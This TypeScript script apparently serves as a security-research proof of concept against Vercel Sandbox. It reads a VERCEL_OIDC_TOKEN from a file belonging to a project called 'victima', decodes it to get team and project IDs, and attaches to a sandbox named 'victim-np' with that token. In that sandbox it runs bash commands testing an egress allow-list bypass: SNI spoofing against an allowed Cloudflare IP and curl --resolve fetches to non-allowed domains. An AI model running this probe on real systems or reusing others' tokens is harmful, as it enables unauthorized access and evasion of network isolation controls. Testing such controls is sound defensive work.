import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== A. allowed example.com resolves to ==="
dig @172.31.0.2 example.com +short 2>&1 | head -3
echo "=== B. SNI to allowed IP 104.16.132.229 for DIFFERENT non-allowed domain (www.cloudflare.com) ==="
timeout 6 openssl s_client -connect 104.16.132.229:443 -servername www.cloudflare.com -brief 2>&1 | head -4
echo "=== C. SNI to allowed IP for a NON-Cloudflare domain (www.microsoft.com) ==="
timeout 6 openssl s_client -connect 104.16.132.229:443 -servername www.microsoft.com -brief 2>&1 | head -3
echo "=== D. full HTTPS GET to www.cloudflare.com via allowed IP + Host header ==="
timeout 6 curl -sk -o /tmp/c -w "code=%{http_code}\\n" --max-time 5 --resolve www.cloudflare.com:443:104.16.132.229 https://www.cloudflare.com/ 2>&1 | tail -1
head -c 100 /tmp/c 2>/dev/null; echo ""
echo "=== E. does example.org resolve? (not allowed) ==="
dig @172.31.0.2 example.org +short 2>&1 | head -2
echo "=== F. IP-based access: 172.66.147.243 (example.com's other IP) to different vhost ==="
timeout 6 curl -sk -o /dev/null -w "code=%{http_code}\\n" --max-time 5 --resolve example.org:443:172.66.147.243 https://example.org/ 2>&1 | tail -1
echo "=== G. confirm: is SNI to allowed IP actually matching content? get cert subject ==="
timeout 6 echo | openssl s_client -connect 104.16.132.229:443 -servername www.cloudflare.com 2>/dev/null | openssl x509 -noout -subject 2>&1 | head -1
echo DONE
`], { wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
